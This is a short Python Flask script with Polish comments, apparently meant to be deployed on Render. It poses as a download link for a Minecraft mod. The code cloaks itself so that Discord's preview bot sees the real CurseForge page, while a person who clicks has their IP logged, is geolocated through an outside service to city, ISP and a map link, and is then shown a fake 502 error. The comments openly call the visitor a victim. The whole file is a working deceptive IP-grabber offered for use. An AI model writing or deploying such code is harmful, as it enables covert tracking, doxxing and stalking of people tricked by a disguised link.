import requests
import sys
from flask import Flask, request, redirect

app = Flask(__name__)

# --- KONFIGURACJA ---
# Link do podglądu dla bota Discorda
ORIGINAL_MOD_LINK = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/cdn-download/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    # Pobieranie IP ofiary (uwzględniając proxy Rendera)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. CLOAKING (Bot widzi moda, człowiek wpada w pułapkę)
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(ORIGINAL_MOD_LINK)

    # 2. LOGOWANIE DO KONSOLI RENDERA
    print(f"\n--- !!! WYKRYTO KLIKNIĘCIE !!! ---", flush=True)
    print(f"IP OFIARY: {ip}", flush=True)

    try:
        # Pobieranie danych o lokalizacji
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country,isp", timeout=7).json()
        
        if r.get("status") == "success":
            lat = r.get('lat')
            lon = r.get('lon')
            # Tworzenie bezpośredniego linku do Google Maps
            google_maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            
            print(f"MIASTO: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"DOSTAWCA (ISP): {r.get('isp')}", flush=True)
            print(f"📍 LINK DO MAPY: {google_maps_url}", flush=True)
        else:
            print("INFO: Nie udało się precyzyjnie namierzyć tego IP.", flush=True)
            
    except Exception as e:
        print(f"BŁĄD PODCZAS NAMIERZANIA: {e}", flush=True)

    print("----------------------------------", flush=True)
    sys.stdout.flush()

    # 3. CO WIDZI OFIARA (Sfingowany błąd serwera)
    return '<h1>502 Bad Gateway</h1><p>The server returned an invalid response from the upstream server. Node: PL-WAW-01</p>', 502

if __name__ == '__main__':
    # Start na porcie 10000 dla Rendera
    app.run(host='0.0.0.0', port=10000)
